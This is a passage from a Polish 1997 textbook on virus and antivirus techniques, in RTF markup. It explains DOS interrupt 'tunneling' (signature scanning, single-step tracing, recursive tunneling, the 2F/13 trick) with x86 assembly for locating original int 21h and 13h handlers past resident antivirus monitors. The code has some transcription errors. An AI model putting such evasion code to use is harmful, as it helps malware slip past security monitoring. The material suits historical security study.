\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JE JEST                  ; jest cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 sekwencji}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP WORD PTR ES:[BX],03EBh ; czy druga z sekwencji ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNE NIEDZIA\uc1\u321\'a3A            ; nie ma sekwencji - tuneling nie dzia\uc1\u322\'b3a}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JEST:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP BYTE PTR ES:[BX+2],OE8h; czy druga cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 sekwencji ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNE NIEDZIA\uc1\u321\'a3A            ; nie ma sekwencji - tuneling nie dzia\uc1\u322\'b3a}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP WORD PTR ES:[BX+5],0FF2Eh ; czy trzecia cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 sekwencji ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNE NIEDZIA\uc1\u321\'a3A            ; nie ma sekwencji - tuneling nie dzia\uc1\u322\'b3a}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP BYTE PTR ES:[BX+7],02Eh ; czy czwarta cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 sekwencji ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNE NIEDZIA\uc1\u321\'a3A            ; nie ma sekwencji - tunelling nie dzia\uc1\u322\'b3a}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; znaleziona pe\uc1\u322\'b3na sekwencja }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BX,WORD PTR ES:[BX+8]}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch LES BX,DWORD PTR ES:[BX]      ; ES:BX wskazuje na oryginalny adres int 21h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NIEDZIALA:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dla przerwania 2Fh sekwencja b\uc1\u281\'eadzia wygl\uc1\u261\'b9da\uc1\u322\'b3a bardzo podobnie, z jedyn\uc1\u261\'b9 zmian\uc1\u261\'b9 w programie warto\uc1\u347\'9cci 0FS z 109Eh na 10C6h i 0FB2h na 0FDAh.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.4.2. Wykorzystanie trybu krokowego procesora (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}tracing}{\f1\fs24\b\lang1045{\*\listtag0})}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do znalezienia oryginalnych wej\uc1\u347\'9c\uc1\u263\'e6 do procedur obs\uc1\u322\'b3ugi przerwa\uc1\u324\'f1 mo\uc1\u380\'bfna wykorzysta\uc1\u263\'e6 tryb krokowy procesora. Po zainstalowaniu odpowiedniego monitora pod przerwaniem krokowym wykonuje si\uc1\u281\'ea jak\uc1\u261\'b9\uc1\u347\'9c testow\uc1\u261\'b9 funkcj\uc1\u281\'ea, kt\'f3rej wynik jest ju\uc1\u380\'bf wcze\uc1\u347\'9cniej znany (np. przez uprzednie wywo\uc1\u322\'b3anie tej funkcji bez monitora przerwania krokowego). Na bazie tego mo\uc1\u380\'bfemy stwierdzi\uc1\u263\'e6 (b\uc1\u281\'ead\uc1\u261\'b9c w procedurze obs\uc1\u322\'b3ugi przerwania krokowego), czy znajdujemy si\uc1\u281\'ea w poszukiwanym, oryginaln}{\f1\fs24\lang1045{\*\listtag0}y}{\f0\fs24\lang1045{\*\listtag0}m kodzie przerwania, poprzez testowanie zawarto\uc1\u347\'9cci odpowiedniego rejestru lub ich grupy.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Dla przerwania int 21h wygodnie \uc1\u347\'9cledzi\uc1\u263\'e6 np. funkcj\uc1\u281\'ea 62h (we\uc1\u378\'9f aktualny adres PSP) lub funkcj\uc1\u281\'ea 30h (we\uc1\u378\'9f numer wersji DOS), dla przerwania int 13h tak\uc1\u261\'b9 funkcj\uc1\u261\'b9 mo\uc1\u380\'bfe by\uc1\u263\'e6 08h (we\uc1\u378\'9f informacj\uc1\u281\'ea o parametrach dysku).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.4.3. Tuneling rekursywny (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}recursive tunneling}{\f1\fs24\b\lang1045{\*\listtag0})}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 blokowania trybu krokowego procesora do znalezienia oryginalnego adresu przerwania 21h mo\uc1\u380\'bfna zastosowa\uc1\u263\'e6 tzw. tuneling rekursywny. Polega on na tym, i\uc1\u380\'bf w otoczeniu aktualnej procedury obs\uc1\u322\'b3ugi przerwania (wskazywanej przez tablic\uc1\u281\'ea przerwa\uc1\u324\'f1), poszukuje si\uc1\u281\'ea kod\'f3w wywo\uc1\u322\'b3a\uc1\u324\'f1 dalekich procedur lub skok\'f3w, dzi\uc1\u281\'eaki kt\'f3rym zwykle przekazywane jest sterowanie do kolejnego elementu \uc1\u322\'b3a\uc1\u324\'f1cucha obs\uc1\u322\'b3ugi prze}{\f1\fs24\lang1045{\*\listtag0}r}{\f0\fs24\lang1045{\*\listtag0}wania. Najcz\uc1\u281\'ea\uc1\u347\'9cciej \uc1\u322\'b3a\uc1\u324\'f1cuch taki sk\uc1\u322\'b3ada si\uc1\u281\'ea z nast\uc1\u281\'eapuj\uc1\u261\'b9cych sekwencji:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Element_l}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .........                ; pierwszy element \uc1\u322\'b3a\uc1\u324\'f1cucha}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Skok_do_Elementu_2}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .........                ; pami\uc1\u281\'ea\uc1\u263\'e6 wykorzystywana przez inne programy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Element_2 .........      ; drugi element \uc1\u322\'b3a\uc1\u324\'f1cucha}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Skok_do_Elementu_3}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .........                ; pami\uc1\u281\'ea\uc1\u263\'e6 wykorzystywana przez inne programy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Element_N .........      ; ostatni element \uc1\u322\'b3a\uc1\u324\'f1cucha - poszukiwana cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 systemu Powr\'f3t_Z_Elementu_N      ; powr\'f3t poprzez rozkaz IRET lub}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; RETF 2 do elementu  poprzedniego lub bezpo\uc1\u347\'9crednio}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                          ; do wywo\uc1\u322\'b3uj\uc1\u261\'b9cego programu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Na przyk\uc1\u322\'b3ad dzia\uc1\u322\'b3anie procedury szukaj\uc1\u261\'b9cej adresu przerwania 21h mo\uc1\u380\'bfna sprowadzi\uc1\u263\'e6 do nast\uc1\u281\'eapuj\uc1\u261\'b9cej sekwencji:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mov ah,52h                       ; pobierz do ES:BX adres struktury }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch int 21h                          ;  LL (lista list) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mov bx,es}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch xor ax,ax                        ; ustaw adres DS:SI na adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mov ds,ax                        ; przerwania 21h wskazywanego}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mov si,21h*4                     ; przez tablice przerwa\uc1\u324\'f1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch xchg ax,di                       ; DI=licznik sprawdzanych bajtow=0}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Adres 32:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ids si,ds:[si]                   ; pobierz adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch or   bx,bx                       ; czy koniec szukania ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch jz   WSegmencieDOS               ; TAK - powr\'f3t DS:SI-adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mov ax,ds                        ; \\ czy jest to segment DOS ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch cmp ax, bx                       ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch jne NastepnyBajt                 ; TAK - znaleziony adres }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch xor bx,bx                        ; BX=0 oznacza koniec szukania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NastepnyBajt:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch lodsw                            ; we\uc1\u378\'9f 2 bajty b\uc1\u281\'ead\uc1\u261\'b9ce cz\uc1\u281\'ea\uc1\u347\'9cci\uc1\u261\'b9 aktualnej procedury dec si                           ; sprawdzamy co bajt}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch cmp al,9Ah                       ; czy jest to CALL FAR PTR ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch je   Adres32                     ; TAK - we\uc1\u378\'9f kolejny adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch cmp al,0EAh                      ; czy jest to JMP FAR PTR ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch je   Adres32                     ; TAK - we\uc1\u378\'9f kolejny adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch cmp ax,0FF2Eh                    ; czy jest to JMP FAR CS:DWORD ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch jne NieJMP_DWORD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch cmp byte ptr [si+l],al           ; czy dalsz\uc1\u261\'b9 cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 rozkazu JMP FAR CS:DWORD ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch jne NieJMP_DWORD}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch mov si,ds:[si+2]                 ; pobierz offset do danych dla skoku jmp short Adres32                          ; TAK - we\uc1\u378\'9f kolejny adres}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieJMP_DWORD:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch inc DI                           ; licznik sprawdzanych bajt\'f3w }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch and DI,4095                      ; je\uc1\u380\'bfeli sprawdzono ju\uc1\u380\'bf 4095 bajt\'f3w, }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch je Recursive21_Exit              ; to ko\uc1\u324\'f1cz, bo tuneling nie dzia\uc1\u322\'b3a}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch jmp NastepnyBajt                 ; we\uc1\u378\'9f kolejny bajt}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch WSegmencieDOS:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ............                     ; adres zosta\uc1\u322\'b3 znaleziony (jest w DS:SI)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch RecursNieDzia\uc1\u322\'b3a:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ............                     ; adres nie zosta\uc1\u322\'b3 znaleziony}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.4.4. Trik2F/13}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do znalezienia oryginalnego programu obs\uc1\u322\'b3ugi przerwania 13h (obs\uc1\u322\'b3uga fizycznych dysk\'f3w) w ROM-BIOS mo\uc1\u380\'bfna zastosowa\uc1\u263\'e6 funkcj\uc1\u281\'ea (13/2F), kt\'f3ra s\uc1\u322\'b3u\uc1\u380\'bfy do ustawiania nowej procedury obs\uc1\u322\'b3ugi dysk\'f3w. Po jej wywo\uc1\u322\'b3aniu dodatkowo zwracana jest informacja o obecnej i pierwotnej (oryginalnej) procedurze obs\uc1\u322\'b3ugi tego przerwania [dok\uc1\u322\'b3adniej: zwracane s\uc1\u261\'b9 warto\uc1\u347\'9cci parametr\'f3w z poprzedniego wywo\uc1\u322\'b3ania funkcji (13/2F)]. Funkcj\uc1\u281\'ea t\uc1\u281\'ea wykorzystuje IO.SYS przy starcie sy}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch stemu, aby przej\uc1\u261\'b9\uc1\u263\'e6 kontrol\uc1\u281\'ea nad r\'f3\uc1\u380\'bfnymi b\uc1\u322\'b3\uc1\u281\'eadami pojawiaj\uc1\u261\'b9cymi si\uc1\u281\'ea przy dost\uc1\u281\'eapie do dysk\'f3w. To, \uc1\u380\'bfe potrzebuje ona parametr\'f3w wej\uc1\u347\'9cciowych, mo\uc1\u380\'bfna pomin\uc1\u261\'b9\uc1\u263\'e6, gdy\uc1\u380\'bf jej dwukrotne wywo\uc1\u322\'b3anie przywraca oryginalne ustawienia systemu. Poni\uc1\u380\'bfsza sekwencja pokazuje, jak za pomoc\uc1\u261\'b9 opisanej funkcji znale\uc1\u378\'9f\uc1\u263\'e6 oryginalny (o ile nie jest on kontrolowany przez program antywirusowy) adres int 13h w ROM-BIOS-ie:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Trik 2F/13 }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AH,13h             ; funkcja - ustaw obs\uc1\u322\'b3ug\uc1\u281\'ea dysk\'f3w DS:DX adres }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab \tab     ; procedury obs\uc1\u322\'b3ugi (mo\uc1\u380\'bfna pomin\uc1\u261\'b9\uc1\u263\'e6 gdy\uc1\u380\'bf za}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab            ; chwil\uc1\u281\'ea i tak zostanie przywr\'f3cona w\uc1\u322\'b3a\uc1\u347\'9cciwa }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                        ; procedura obs\uc1\u322\'b3ugi). ES:BX adres procedury, kt\'f3ra system}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                        ; b\uc1\u281\'eadzie ustawia\uc1\u322\'b3 jako procedur\uc1\u281\'ea obs\uc1\u322\'b3ugi przerwania nr 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab \tab     ; przy ewentualnym zawieszeniu systemu lub po wywo\uc1\u322\'b3aniu}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab           ; int 19h (tak\uc1\u380\'bfe mo\uc1\u380\'bfna pomin\uc1\u261\'b9\uc1\u263\'e6) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 2Fh                ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab           ; po wywo\uc1\u322\'b3aniu ES:BX zwraca adres procedury, kt\'f3ra system}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab           ; ustawi jako int 13h w wy\uc1\u380\'bfej wymienionych wypadkach, czyli}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab \tab     ; zwykle b\uc1\u281\'eadzie to oryginalna procedura obs\uc1\u322\'b3ugi przerwania }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch 13h MOV SEG_13,ES      ; trzeba zapami\uc1\u281\'eata\uc1\u263\'e6 adres oryginalnej procedury obs\uc1\u322\'b3ugi }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV OFS_13,BX          ;  intl3h, znajduj\uc1\u261\'b9cej si\uc1\u281\'ea w ES:BX }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AH,13h             ; funkcja - ustaw obs\uc1\u322\'b3ug\uc1\u281\'ea dysk\'f3w DS:DX i ES:BX to warto\uc1\u347\'9cci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab                  ; z poprzedniego wywo\uc1\u322\'b3ania funkcji (13/2F) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 2Fh                ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea 13h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Poni\uc1\u380\'bfszy program znajduje (o ile to mo\uc1\u380\'bfliwe) wej\uc1\u347\'9ccia do przerwa\uc1\u324\'f1 21h, 13h, 2Fh, z wykorzystaniem r\'f3\uc1\u380\'bfnych technik tunelingowych-}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                     TUNEL v1.0, Autor : Adam Blaszczyk 1997                ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;   Program demonstruje uzycie kilku odmian tunelingu                        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;   do znalezienia oryginalnych adresow przerwan                             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
